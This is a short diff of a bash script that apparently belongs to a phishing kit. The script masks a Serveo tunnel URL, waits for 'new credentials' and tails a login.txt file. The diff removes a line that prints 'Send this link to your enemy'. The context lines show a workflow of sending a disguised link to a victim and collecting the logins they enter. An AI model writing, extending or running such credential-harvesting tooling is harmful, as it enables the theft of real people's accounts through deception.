@@ -92,7 +92,6 @@ if [ ! -z "$SERVEO_URL" ]; then
   # echo -e "${GRN}[+] Serveo URL: $SERVEO_URL${NC}"  # Commented to hide raw URL
   echo -e "${CYAN}[+] Masked URL: $MASKED_URL${NC}"
   if [[ "$MASKED_URL" == *"serveo.net"* ]]; then
-  echo -e "${GRN}[€] Send this link to your enemy${NC}"
   echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
   tail -n 0 -f login.txt
 else
